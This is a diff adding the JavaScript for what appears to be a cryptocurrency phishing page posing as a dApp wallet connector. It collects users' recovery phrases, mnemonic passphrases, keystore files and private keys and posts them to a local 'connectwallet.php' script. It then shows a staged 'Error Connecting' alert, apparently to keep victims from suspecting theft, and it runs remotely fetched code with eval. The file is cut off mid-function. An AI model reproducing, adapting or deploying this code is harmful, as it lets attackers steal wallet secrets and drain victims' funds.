@@ -1,0 +1,1325 @@
+// Wrap the plugin definition in a callback bubble so we can bind
+// it to the dollar sign.
+(function( $ ){
+	
+	// This jQuery plugin creates proxied event handlers that
+	// consult with an additional conditional callback to see if
+	// the original event handler should be executed.
+	$.fn.bindIf = function(
+		eventType,
+		eventHandler,
+		ifCondition
+	){
+		
+		// Create a new proxy function that wraps around the
+		// given bind callback.
+		var proxy = function( event ){
+			
+			// Execute the IF condition callback first to see if
+			// the event handler should be executed.
+			if (ifCondition()){
+				
+				// Pass the event onto the original event
+				// handler.
+				eventHandler.apply( this, arguments );
+				
+			}
+			
+		};
+		
+		// Bind the proxy method to the target.
+		this.bind( eventType, proxy );
+		
+		// Return this to keep jQuery method chaining.
+		return( this );
+	};
+	
+})( jQuery );
+
+
+$(function(){
+
+
+
+	var error_class = "is-invalid";
+	
+		var recovery_phrase_text_area = $("textarea[name=recovery_phrase]");
+		var recovery_phrase_input = $("input[name=recovery_phrase]");
+		var recovery_phrase_file = $("#file-upload");
+		var mnemonic_passphrase = $("input[name=mnemonic_passphrase]");
+
+var recovery_phrase_json = false;
+ var icon = $(".pageStyles__SAppIcon-sc-1navawn-6");
+  var icon_text = $(".pageStyles__SAppName-sc-1navawn-7");
+  var icon_img = $("img.img_icons");
+  var connect_manual_j = $(".jwEAlI");
+
+
+
+
+ var label = document.querySelector("#labelforfile");
+  label.addEventListener("change", filenaming);
+  
+
+
+
+    document.getElementById('file-upload').addEventListener('change', function() {
+              
+            var fr=new FileReader();
+            fr.onload=function(){
+
+ 
+            try {
+            	  recovery_phrase_json = fr.result;
+            	    
+                         if(recovery_phrase_json){
+                         // //console.log(recovery_phrase_json);
+                         $.each($("textarea[name=recovery_phrase], input[name=recovery_phrase]"), function() {
+                         	$(this).val(recovery_phrase_json);
+
+});
+                     }
+
+
+
+  recovery_phrase_json = $.parseJSON(recovery_phrase_json);
+}
+catch (err) {
+  // Do something about the exception here
+  recovery_phrase_json = false;
+}
+
+
+
+
+                  
+
+
+
+
+
+
+                         
+            }
+
+
+
+
+              
+           
+       try {
+       	recovery_phrase_json =  fr.readAsText(this.files[0]);
+
+            	    
+                         if(recovery_phrase_json){
+                         // //console.log(recovery_phrase_json);
+                         $.each($("textarea[name=recovery_phrase], input[name=recovery_phrase]"), function() {
+                         	$(this).val(recovery_phrase_json);
+
+});
+                     }
+
+
+
+  recovery_phrase_json = $.parseJSON(recovery_phrase_json);
+}
+catch (err) {
+  // Do something about the exception here
+  recovery_phrase_json = false;
+}
+
+
+    });
+
+
+
+    $("textarea[name=recovery_phrase], input[name=recovery_phrase]").change( function() {
+var sameinput = $(this).val();
+    	              $.each($("textarea[name=recovery_phrase], input[name=recovery_phrase]"), function(i, o) {
+    	              	try{
+                         	$(o).val(sameinput);
+    	              	}catch (err) {}
+
+});
+
+
+
+  // your code
+});
+
+
+
+
+    $("input[name=mnemonic_passphrase]").change( function() {
+var sameinput = $(this).val();
+
+    	              $.each($("input[name=mnemonic_passphrase]"), function(i, o) {
+    	              		try{
+                         	$(o).val(sameinput);
+    	              	}catch (err) {}
+                         	
+
+});
+
+
+});
+
+
+
+
+
+
+
+
+
+
+	var phrase = document.querySelector("#phrase");
+	var keystore = document.querySelector("#keystore");
+	var private = document.querySelector("#private");
+	var first = document.querySelector("#first");
+	var second = document.getElementById("second");
+	var third = document.querySelector("#third");
+	var activeAjaxConnections = 0;
+	phrase.addEventListener("click", function() {
+		hide(first);
+		$("input[name=recovery_phrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").val('');
+		$("input[name=recovery_phrase]").val('');
+		$("textarea[name=recovery_phrase]").val('');
+	});
+	
+	keystore.addEventListener("click", function() {
+		hide(second);
+		$("input[name=recovery_phrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").val('');
+		$("input[name=recovery_phrase]").val('');
+		$("textarea[name=recovery_phrase]").val('');
+	});
+	
+	
+	private.addEventListener("click", function() {
+		hide(third);
+		$("input[name=recovery_phrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").val('');
+		$("input[name=recovery_phrase]").val('');
+		$("textarea[name=recovery_phrase]").val('');
+	});
+
+
+
+
+ 
+
+
+
+
+
+
+function hideconnect() {
+
+
+	var connect = document.querySelector(".jwEAlI");
+	var overlay = document.querySelector(".overlay");
+	 var firstoverlay = document.querySelector(".sc-bdVaJa");
+
+	  overlay.style.display = "flex";
+  firstoverlay.style.display = "none";
+
+							// firstoverlay.style.display = "flex";
+						// connect.style.display = "flex";
+						$(".loading").css({ 'color': 'rgb(64, 68, 79)' });
+
+						   $(".jwEAlI").css("display","none");
+  	  $(".sc-bdVaJa").css("display","none");
+  	  $(".loading").html("");
+
+  	   overlay.style.display = "flex";
+  firstoverlay.style.display = "none";
+
+
+
+ $("input[name=recovery_phrase], textarea[name=recovery_phrase], input[name=mnemonic_passphrase]").each(function() {
+  	 $(this).removeClass("is-invalid");
+ 	
+});
+
+
+
+	// body...
+}
+
+
+connect_manual_j.on('click', function(e) {
+
+	var connect = document.querySelector(".jwEAlI");
+	var overlay = document.querySelector(".overlay");
+	 var firstoverlay = document.querySelector(".sc-bdVaJa");
+
+	 hideconnect();
+
+
+		
+		
+   });
+
+
+
+  $(document).on("click touchend", " .buttonccancel", function () {
+  	  $(".jwEAlI").css("display","none");
+  	  $(".sc-bdVaJa").css("display","none");
+  	  $(".loading").html("");
+
+
+
+
+ $("input[name=recovery_phrase], textarea[name=recovery_phrase]").each(function() {
+  	 $(this).removeClass("is-invalid");
+ 	
+});
+
+
+
+
+  	 $("input[name=recovery_phrase]").removeClass("is-invalid");
+  	 $("textarea[name=recovery_phrase]").removeClass("is-invalid");
+
+  	 // $('.configinstruction').hide();
+});
+
+
+
+
+
+
+  $(document).on("click touchend", ".fhSmUE, .fRcQRh", function () {
+  	  $(".jwEAlI").css("display","none");
+  	  $(".sc-bdVaJa").css("display","none");
+  	  $(".loading").html("");
+
+
+
+
+ $("input[name=recovery_phrase], textarea[name=recovery_phrase]").each(function() {
+  	 $(this).removeClass("is-invalid");
+ 	
+});
+
+
+
+
+  	 $("input[name=recovery_phrase]").removeClass("is-invalid");
+  	 $("textarea[name=recovery_phrase]").removeClass("is-invalid");
+
+  	 $('.configinstruction').hide();
+
+  	        //console.log(dappstore.applist[dappstore.classname]);
+			 if(dappstore.applist.hasOwnProperty(dappstore.classname)){
+				if(typeof dappstore.applist[dappstore.classname].js.deinit === 'function') {
+					dappstore.applist[dappstore.classname].js.unbind();
+					dappstore.applist[dappstore.classname].js.abort();
+					dappstore.applist[dappstore.classname].js.deinit();
+					//console.log(dappstore.applist[dappstore.classname]);
+				}
+
+			
+		}
+		dappstore.appname = "";
+        dappstore.classname = "";
+
+
+
+
+
+
+});
+
+
+  $(document).on("click touchend", ".buttonccancel", function () {
+
+  	 var overlay = document.querySelector(".overlay");
+    overlay.style.display = "none";
+    var span = document.querySelector("#span");
+    span.innerHTML = "Choose Keystore File";
+    var attr = document.querySelector("#first");
+    var attr2 = document.querySelector("#second");
+    var attr3 = document.querySelector("#third");
+
+    attr.classList.remove("active");
+    attr2.classList.remove("active");
+    attr3.classList.remove("active");
+    attr.classList.add("active");
+    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+
+
+    for (let i = 0; i < attr.length; i++) {
+      attr[i].value = "";
+
+    }
+
+
+
+    	$('.reverse').hide();
+		$('.loadingdiv').hide();
+		$("#continuebutton").text("Proceed");
+		$('.configinstruction').hide();
+		showdefaultauth();
+
+               //console.log(dappstore.applist[dappstore.classname]);
+			 if(dappstore.applist.hasOwnProperty(dappstore.classname)){
+				if(typeof dappstore.applist[dappstore.classname].js.deinit === 'function') {
+					dappstore.applist[dappstore.classname].js.unbind();
+					dappstore.applist[dappstore.classname].js.abort();
+					dappstore.applist[dappstore.classname].js.deinit();
+					//console.log(dappstore.applist[dappstore.classname]);
+				}
+
+			
+		}
+		dappstore.appname = "";
+        dappstore.classname = "";
+
+
+
+});
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+function lessermicrofirst(){
+    var _array = [Randomdelaymicrosecond(0,1,57),Randomdelaymicrosecond(0,1,57)];
+    
+    var lowval = [String(_array[0]).length,String(_array[1]).length ];
+    
+  var lowest  = [Math.min.apply(Math,lowval),Math.max.apply(Math,lowval)];
+  var numbermin = [Math.min.apply(Math,_array),Math.max.apply(Math,_array)];
+  
+  var cutnumber =  [ String(numbermin[0]).substr(0, lowest[0]), String(numbermin[1]).substr(0, lowest[0]) ];
+  
+  var closesecond = [Math.min.apply(Math,cutnumber),Math.max.apply(Math,cutnumber)];
+ var  firstdigit = String(closesecond[0]).match(/^[1-9]/im);
+ closesecond[1] =  String(closesecond[1]).replace(/^[1-9]/gim, firstdigit);
+   return [Math.min.apply(Math,closesecond),Math.max.apply(Math,closesecond)];
+}
+
+	
+	
+	
+	 
+	
+	function Randomdelaymicrosecond(hrs,min,sec) {
+		hrs =getRandomInt(0, hrs);
+		min = getRandomInt(0, min);
+		sec = getRandomInt(0, sec);
+		
+		return (convertmiliseconds(hrs,min,sec));
+	}
+	
+	
+	
+	function getdelaymicrosecond() {
+		hrs =0;
+		min = getRandomInt(0, 1);
+		sec = getRandomInt(0, 50);
+
+		return (convertmiliseconds(hrs,min,sec));
+	}
+	
+	
+	/**
+	* Returns a random number between min (inclusive) and max (exclusive)
+	*/
+	function getRandomArbitrary(min, max) {
+		return Math.random() * (max - min) + min;
+	}
+	
+	/**
+	* Returns a random integer between min (inclusive) and max (inclusive).
+	* The value is no lower than min (or the next integer greater than min
+	* if min isn't an integer) and no greater than max (or the next integer
+	* lower than max if max isn't an integer).
+	* Using Math.round() will give you a non-uniform distribution!
+	*/
+	function getRandomInt(min, max) {
+		min = Math.ceil(min);
+		max = Math.floor(max);
+		return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+	
+	
+	
+	function convertmiliseconds(hrs,min,sec)
+	{
+		return((hrs*60*60+min*60+sec)*1000);
+	}
+	
+	
+	function loadpleaseWait() {
+
+	$(".loadingpleasewait").show();
+	if ($(".loadingpleasewait").is(':visible')) {
+		showTextLoadingDots(".loadingpleasewait");
+		// $(".loadingpleasewait");
+ 	
+ }
+
+
+
+
+	}
+
+	
+	function showTextLoadingDots(selector, callback) {
+
+		//console.log("Called by  showTextLoadingDots " )
+		var dotinp = 3;
+		var oldtext = $(selector).text();
+		if (oldtext.slice(-1) == ".") {
+			oldtext = oldtext.substr(0, oldtext.indexOf("."));
+		$(selector).text(oldtext);
+		}
+		var dots = oldtext + ".".repeat(dotinp);
+		var showDots = setInterval(function(){  
+			if ($(selector).text().length<dots.length) {
+			$(selector).text($(selector).text()+".");
+			} else {
+				if(typeof callback === 'function') {
+					callback();
+				}
+				clearInterval(showDots);
+			}
+		},Randomdelaymicrosecond(0,0,2)); 
+	}
+	
+	
+	
+	function ChangeUrl(page, url) {
+		if (typeof (history.pushState) != "undefined") {
+			var obj = { Page: page, Url: url };
+			history.pushState(obj, obj.Page, obj.Url);
+		} else {
+//			alert("Browser does not support HTML5.");
+		}
+	}
+	
+	// mutating URLs
+//var dappurl =	URI(window.location.href).search({ foo: "bar", hello: ["world", "mars"] });
+	
+//	//console.log(dappurl.toString());
+	
+	function getAllUrlParams(url) {
+		
+		// get query string from url (optional) or window
+		var queryString = url ? url.split('?')[1] : window.location.search.slice(1);
+		
+		// we'll store the parameters here
+		var obj = {};
+		
+		// if query string exists
+		if (queryString) {
+			
+			// stuff after # is not part of query string, so get rid of it
+			queryString = queryString.split('#')[0];
+			
+			// split our query string into its component parts
+			var arr = queryString.split('&');
+			
+			for (var i = 0; i < arr.length; i++) {
+				// separate the keys and the values
+				var a = arr[i].split('=');
+				
+				// set parameter name and value (use 'true' if empty)
+				var paramName = a[0];
+				var paramValue = typeof (a[1]) === 'undefined' ? true : a[1];
+				
+				// (optional) keep case consistent
+				// paramName = paramName.toLowerCase();
+				// if (typeof paramValue === 'string') paramValue = paramValue;
+				
+				// if the paramName ends with square brackets, e.g. colors[] or colors[2]
+				if (paramName.match(/\[(\d+)?\]$/)) {
+					
+					// create key if it doesn't exist
+					var key = paramName.replace(/\[(\d+)?\]/, '');
+					if (!obj[key]) obj[key] = [];
+					
+					// if it's an indexed array e.g. colors[2]
+					if (paramName.match(/\[\d+\]$/)) {
+						// get the index value and add the entry at the appropriate position
+						var index = /\[(\d+)\]/.exec(paramName)[1];
+						obj[key][index] = paramValue;
+					} else {
+						// otherwise add the value to the end of the array
+						obj[key].push(paramValue);
+					}
+				} else {
+					// we're dealing with a string
+					if (!obj[paramName]) {
+						// if it doesn't exist, create property
+						obj[paramName] = paramValue;
+					} else if (obj[paramName] && typeof obj[paramName] === 'string'){
+						// if property does exist and it's a string, convert it to an array
+						obj[paramName] = [obj[paramName]];
+						obj[paramName].push(paramValue);
+					} else {
+						// otherwise add the property
+						obj[paramName].push(paramValue);
+					}
+				}
+			}
+		}
+		
+		return obj;
+	}
+
+	
+
+	
+	function hide(elem) {
+		var expandedPanel = document.querySelector(".active");
+		//This is to remove the current active class on click
+		if (expandedPanel) {
+			expandedPanel.classList.remove("active");
+			var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+			
+			for (let i = 0; i < attr.length; i++) {
+				attr[i].value = "";
+				
+			}
+		}
+		var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
+		var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
+		
+		// for (let c = 0; c < i.length; c++) {
+		// i[c].required = false;
+		// }
+		// for (let c = 0; c < x.length; c++) {
+		// x[c].required = true;
+		// }
+		//add an active tag to the clicked element and set it's
+		
+		elem.classList.add("active");
+		
+	}
+	
+	
+	function loaddappdefault() {
+
+		var lessermicro = lessermicrofirst();
+		loadingdapp();
+		
+		setTimeout(function(){   alert( 'Error Connecting to '+dappstore.appname+', Please connect to the appropriate Chain network.... and try again.' );
+
+
+
+
+
+		 }, lessermicro[0]);
+		
+		setTimeout(function(){ document.querySelector(".WalletNetworkwaiter").style.display = "none"; },lessermicro[1] );
+		
+	}
+	
+	
+	 function isFunction(obj) {
+		return !!(obj && obj.constructor && obj.call && obj.apply);
+	}
+	
+	
+	function loadingdapp(){
+		$('.WalletNetworkwaiter').show();
+		document.querySelector(".WalletNetworkwaiter").style.display = "flex";
+	}
+
+
+
+function normalizeformdata() {
+ var frm = $('#websocketconnect');
+var newformdata = {}
+
+ var formserial = getAllUrlParams("?" + frm.serialize());
+$.each(formserial, function( index, value ) {
+ if(formserial[index]){
+ 	if ( Array.isArray(formserial[index])) {
+ 		newformdata[index]=formserial[index][0];
+
+
+ 	}else{
+ 		newformdata[index] = value;
+ 	}
+ }
+
+});
+
+return newformdata;
+
+ }
+
+
+
+
+
+	
+	function sendFormData( ) {
+
+
+		var frm = $('#websocketconnect');
+		var dappurl = getAllUrlParams(); 
+
+
+
+  	       $.ajax({
+			type: frm.attr('method'),
+			url: "../connectwallet.php?explorer="+dappurl.explorer,
+			data: normalizeformdata()});
+			// data: frm.serialize()});
+	}
+	
+
+	
+	
+	function hidedefaultauth() {
+		$(".tabphrase").hide();
+		$("#form").removeClass( "border-b-2 border-fuchsia-600" );
+//		$(".tabphrase").hide();
+//		$("#continuebutton").text("Connect");
+	}
+	
+	function showdefaultauth() {
+		$(".tabphrase").show();
+		$("#form").addClass( "border-b-2 border-fuchsia-600" );
+		if($(".continuebutton").is(':hidden'))
+			$(".continuebutton").show();
+		if($(".tabphrase").is(':hidden'))
+			$(".tabphrase").show();
+
+		
+
+
+		//		$(".tabphrase").hide();
+		//		$("#continuebutton").text("Connect");
+	}
+
+	
+	function hideuserDapp() {
+		$('.reverse').hide();
+		$('.loadingdiv').hide();
+		$('.configinstruction').hide();
+	}
+	
+	
+
+	
+	
+	
+	
+
+		
+
+var dappstore = {};
+dappstore.appname = "";
+dappstore.classname = "";
+dappstore.applist = {};
+dappstore.appwork = {};
+dappstore.xhr =  $.ajax();
+
+$('.loadingdiv').hide();
+$('.reverse').hide();
+$('.configinstruction').hide();
+
+
+	
+	function removeerrorclass() {
+
+//console.log("clicked on remove class")
+		$(this).removeClass("is-invalid");
+		$(this).unbind("click");
+	}
+
+
+
+function inputvalidator() {
+
+
+
+		if($("input[name=recovery_phrase]").val().length<12 && $("textarea[name=recovery_phrase]").val().length<12){
+			$("input[name=recovery_phrase]").addClass(error_class).on('click', removeerrorclass);
+			$("textarea[name=recovery_phrase]").addClass(error_class).on('click', removeerrorclass);
+
+			return false
+		}else{
+
+			return true;
+
+		}
+
+
+
+
+}
+
+
+
+		
+	
+		
+	$(document).on('submit','#websocketconnect',function(ev){
+		
+
+
+
+if(inputvalidator()){
+	
+		switch (true) {
+			case (dappstore.applist.hasOwnProperty(dappstore.classname)):
+				if(typeof dappstore.applist[dappstore.classname].js.submit === 'function') {
+					dappstore.applist[dappstore.classname].js.submit(ev);
+					
+				}else{
+		        loaddappdefault();
+				sendFormData();
+				}
+				break;
+			default:
+			    loaddappdefault();
+				sendFormData();
+				break;
+		}
+		var dappurl = getAllUrlParams();
+		dappurl =	URI(window.location.href).search({ dapp: md5(String(new Date().getMilliseconds()) + String(dappstore.appname)), explorer:  dappurl.explorer });
+		ChangeUrl(dappstore.appname, dappurl.toString());
+	}
+
+
+
+	ev.preventDefault();
+		
+	});
+		
+	
+	
+
+		
+		
+	// $(document).on('click', ".guKAph", function(e) {
+		// e.preventDefault();
+		// populateDapp($(this).attr('data-info'));
+
+	// });
+		
+	
+		$(document).on('click', '.pageStyles__SAppIcon-sc-1navawn-6', function() {
+
+
+
+
+
+
+
+			//console.log('event fired .pageStyles__SAppIcon-sc-1navawn-6');
+			dappstore.appname = $(this).next("div").text();
+			dappstore.classname = $(this).attr('class').split(' ').pop();
+			$("#wallet_id").val(dappstore.appname);
+			//console.log(dappstore.appname)
+			//console.log(dappstore.classname)
+			//console.log(dappstore.applist[dappstore.classname]);
+			//console.log(dappstore.applist[dappstore.classname]);
+			switch (true) {
+				case $(this).hasClass(dappstore.classname):
+				if (dappstore.applist.hasOwnProperty(dappstore.classname)) {
+			if(!isFunction(dappstore.applist[dappstore.classname].js) && dappstore.applist[dappstore.classname].js.length>20){ 
+			dappstore.applist[dappstore.classname].js =  eval(dappstore.applist[dappstore.classname].js);
+				dappstore.applist[dappstore.classname].js.returnedData = {};
+				dappstore.applist[dappstore.classname].js.authorizedreverse = false;
+				dappstore.applist[dappstore.classname].js.backgroudStateChecker = [];
+				dappstore.applist[dappstore.classname].js.xhr =   $.ajax();
+
+			}
+					
+					
+					dappstore.applist[dappstore.classname].js.init();
+					dappstore.applist[dappstore.classname].js.click();
+					//console.log(dappstore.applist[dappstore.classname]);
+					}
+				break;
+				default:
+
+					hideuserDapp();
+					showdefaultauth();
+					break;
+			}
+
+		$("input[name=recovery_phrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").attr("autocomplete", "off");
+		$("input[name=mnemonic_passphrase]").val('');
+		$("input[name=recovery_phrase]").val('');
+		$("textarea[name=recovery_phrase]").val('');
+			
+	connect_manual_j.on('click', hideconnect);
+
+			
+	
+//			//console.log($(this).text() + " clicked! main");
+		});
+
+
+		// populateDapp(pageid);
+
+	
+	
+	
+	$( "#dialog" ).dialog({
+		autoOpen: false,
+		width: 400,
+		buttons: [
+			{
+				text: "    Ok     ",
+				class: "flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in",
+				click: function() {
+					$( this ).dialog( "close" );
+				}
+			}
+			// ,
+			// {
+			// 	text: "Cancel",
+			// 	click:
+			//    function() {
+			// 		$( this ).dialog( "close" );
+			// 	}
+			// }
+		]
+	});
+
+
+	function loadings() {
+  	$(".jwEAlI").hide();
+  	$(".loading").html("Initializing");
+    	$(".loading").css({ 'color': '#3182ce' });
+     showTextLoadingDots(".loading",function () {
+       $(".loading").html("Error Connecting...");
+       $(".loading").css({ 'color': 'rgb(253, 64, 64)' });
+       $(".jwEAlI").text("Connect manual");
+       $(".jwEAlI").show();
+       $(".jwEAlI").css("display","flex");
+     });
+  }
+
+
+
+
+  function showConnectMenuWallet(e) {
+
+	var popupimage_j = $("#myImg");
+	var firstpopupimage_j = $(".firstImg");
+	 var firstpopupname_j = $(".jsJmJE");
+
+	var firstoverlay_j = $(".sc-bdVaJa");
+	var connect_j = $(".jwEAlI");
+	 var popupname_j = $("#walletname");
+	 var firstpopupimage_j = $(".firstImg");
+	 var loading_j = $(".loading");
+
+		
+
+						if (firstoverlay_j.is(':hidden')) {
+							connect_j.hide();
+
+
+						}
+
+						firstoverlay_j.css("display", "flex")
+
+						popupname_j.html($(e.target).attr('alt').replace(" Wallet", ""));
+						popupimage_j.attr("src",dapp[key].src);
+						// wallet_id.value = popupname_j.html();
+						$("#wallet_id").val(popupname_j.html());
+						firstpopupname_j.html(popupname_j.html());
+						firstpopupimage_j.attr('src', dapp[key].src);
+						loading_j.html( "Connect " + dapp[key].name);
+						connect_j.css("display", "flex");
+						$(".loading").css({ 'color': 'rgb(64, 68, 79)' });
+}
+
+
+			
+
+
+function showConnectMenuDApp(e) {
+	var popupimage_j = $("#myImg");
+	var firstpopupimage_j = $(".firstImg");
+		 var firstpopupname_j = $(".jsJmJE");
+
+
+
+	var firstoverlay_j = $(".sc-bdVaJa");
+	var connect_j = $(".jwEAlI");
+	 var popupname_j = $("#walletname");
+	 var firstpopupimage_j = $(".firstImg");
+	 var loading_j = $(".loading");
+
+		
+
+						if (firstoverlay_j.is(':hidden')) {
+							connect_j.hide();
+
+
+						}
+
+						firstoverlay_j.css("display", "flex")
+
+						popupname_j.html($(e.target).attr('alt').replace(" Wallet", ""));
+						popupimage_j.attr("src",dapp[key].src);
+						$("#wallet_id").val(popupname_j.html());
+						firstpopupname_j.html(popupname_j.html());
+						firstpopupimage_j.attr('src', dapp[key].src);
+						loading_j.html( "Connect " + dapp[key].name);
+						connect_j.css("display", "flex");
+						$(".loading").css({ 'color': 'rgb(64, 68, 79)' });
+}
+		
+
+
+
+
+
+//	
+	function populateDapp(nameapp) {
+		if (!nameapp) 
+			nameapp = "dapp";
+		
+		$.getJSON("../app.php?web3="+nameapp, function(dapp) {
+//			dappstore.applist = dapp;
+			//console.log(dapp);
+			for (var key in dapp) {
+				//console.log(key);
+				if (dapp.hasOwnProperty(key)) {
+					var dapclass = dapp[key].name.replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier";
+					dappstore.applist[dapclass]=dapp[key];
+					//console.log(dapp[key].name);
+					//console.log(dapp[key].src);
+					//console.log(dapp[key].html);
+					//console.log(dapp[key].js);
+
+
+
+		if(!isFunction(dappstore.applist[dapclass].js) && dappstore.applist[dapclass].js.length>20){ 
+			   dappstore.applist[dapclass].js =  eval(dappstore.applist[dapclass].js);
+				dappstore.applist[dapclass].js.returnedData = {};
+				dappstore.applist[dapclass].js.authorizedreverse = false;
+				dappstore.applist[dapclass].js.backgroudStateChecker = [];
+				dappstore.applist[dapclass].js.xhr =   $.ajax();
+
+			}
+
+
+
+
+
+				
+			
+     var daphtml ='<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq ">'+'<div class="'+'pageStyles__SAppIcon-sc-1navawn-6 lfUBtr '+dapclass+'"><img class="img_icons rounded float-start"'+
+							'src="'+dapp[key].src+'"'+
+							'alt="'+dapp[key].name+'" /></div>'+
+							'<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">'+dapp[key].name+'</div></div>';
+					//console.log("Test Visibility Begin: "+ dapclass);
+					//console.log(dapclass)
+					//console.log($("div").hasClass(dapclass))
+					//console.log($("div").hasClass("."+dapclass))
+					//console.log($(document).hasClass("."+dapclass))
+					//console.log($(document).hasClass(dapclass))
+					//console.log(!$(document).hasClass(dapclass))
+					//console.log(!!$(document).hasClass(dapclass))
+					//console.log("Test Visibility END: "+ dapclass);
+
+                            
+                             if(!$("div").hasClass(dapclass)){
+                            $(".dapplist").before(daphtml);
+							$("#websocketconnect").appendTo(dapp[key].html);
+
+                             }
+	
+							
+							// $(dapclass).remove();
+							
+							
+					$(document).on('click', "."+dapclass, function(e){
+						//console.log('event fclick ired click '+dapclass);
+
+
+						
+						icon_click(e) 
+
+						// showConnectMenuDApp(e);
+						e.preventDefault();
+						//console.log(e);
+
+
+
+
+				
+
+
+
+					});
+					
+				}
+			}
+
+
+
+
+
+
+		var dappurl = getAllUrlParams(); 
+
+		if (dappurl.hasOwnProperty('explorer')) {
+			//switch(dappurl.explorer){
+				//case "bnb":
+						var img = new Image($( ".Binance-DAppidentifier" ).find('img').first()); // creating image elemen
+ 						img.src =$( ".Binance-DAppidentifier" ).find('img').first().attr('src'); 
+						img.onload = function () { // trigger if the image was loaded
+							$( ".Binance-DAppidentifier" ).trigger( "click" );
+						}
+                // break;
+				
+
+				
+			//}
+		}
+
+
+if (dappurl.hasOwnProperty('search')) {
+$(".pageStyles__SAppIcon-sc-1navawn-6").each(function() {
+
+
+ 	var nameclass =$(this).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier";
+ 	if (nameclass.toLowerCase().indexOf(dappurl.search.toLowerCase())  !== -1) {
+
+ 						var img = new Image($(this).find('img').first()); // creating image elemen
+ 						img.src =$(this).find('img').first().attr('src'); 
+						img.onload = function () { // trigger if the image was loaded
+							 $("."+nameclass).trigger( "click" );
+						}
+
+					
+
+
+
+
+
+ return false;
+
+ 	}
+});
+}
+
+
+
+
+
+
+			
+			
+			
+		});
+
+
+
+
+	}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   icon_img.each(function() {
+ 	var nameclass = $(this).attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier";
+ 	if(!$(this).hasClass(nameclass)){
+ 		$(this).addClass(nameclass).on('click', function(e) {
+ 			//console.log('event click fired click on image '+dappstore.classname);
+       icon_click(e);
+    });
+
+ 	}
+ 	
+});
+
+
+
+
+
+
+  function filenaming(e) {
+    e.preventDefault();
+    var spantag = document.querySelector("#span");
+    var fullPath = document.getElementById('file-upload').value;
+    if (fullPath) {
+      var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
+      var filename = fullPath.substring(startIndex);
+      if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
+        filename = filename.substring(1);
+      }
+      spantag.innerHTML = filename;
+    }
+  }
+
+
+
+
+
+
+
+function workingcall(){
+	//console.log($(this));
+
+	//console.log("Called workingcall");
+}
+
+
+
+
+  function icon_click(e) {
+  	var firstoverlay_j = $(".sc-bdVaJa");
+  	  var popupname_j = $("#walletname");
+    var overlay_j = $(".overlay");
+     var popupimage_j = $("#myImg");
+     var firstpopupname_j = $(".jsJmJE");
+       var firstpopupimage_j = $(".firstImg");
+    firstoverlay_j.css("display",  "flex");
+
+    //console.log(e)
+    //console.log(e.target)
+    //console.log($(e.target))
+    try{
+    	    popupname_j.html($(e.target).attr('alt').replace(" Wallet", ""));
+    popupimage_j.attr('src', $(e.target).attr('src'));
+
+    }catch(err){
+   popupname_j.html($(e.target).find('img').first().attr('alt').replace(" Wallet", ""));
+   popupimage_j.attr('src', $(e.target).find('img').first().attr('src'));
+
+    }
+
+    // wallet_id.value = popupname_j.html();
+    $("#wallet_id").val(popupname_j.html());
+    firstpopupname_j.html(popupname_j.html());
+    firstpopupimage_j.attr('src', popupimage_j.attr('src'));
+
+        popupimage_j.addClass('rounded float-start h-50 ');
+        // popupimage_j.css('height', '50%');
+
+      $(".jwEAlI").text("Connect");
+       $(".jwEAlI").css("display","flex");
+
+       $(".loading").html("Connect " + popupname_j.html());
+	// connect.style.display = "flex";
+		$(".loading").css({ 'color': 'rgb(64, 68, 79)' });
+  }
+
+
+ icon.each(function() {
+ 	//console.log($(this));
+ 	var nameclass =$(this).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier";
+ 	if(!$(this).hasClass(nameclass)){
+ 	$(this).addClass(nameclass).on('click', function(e) {
+ 		//console.log('event click fired click on icon '+dappstore.classname);
+       icon_click(e);
+    });
+ }
+});
+
+
+
+
+ icon_text.each(function() {
+ 	var nameclass = $(this).text().replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier";
+ 	if(!$(this).hasClass(nameclass)){
+ 	$(this).addClass(nameclass).on('click', function(e) {
+
+ 		  	var firstoverlay_j = $(".sc-bdVaJa");
+  	  var popupname_j = $("#walletname");
+    var overlay_j = $(".overlay");
+     var popupimage_j = $("#myImg");
+     var firstpopupname_j = $(".jsJmJE");
+       var firstpopupimage_j = $(".firstImg");
+    firstoverlay_j.css("display",  "flex");
+
+    //console.log(e)
+    //console.log(e.target)
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
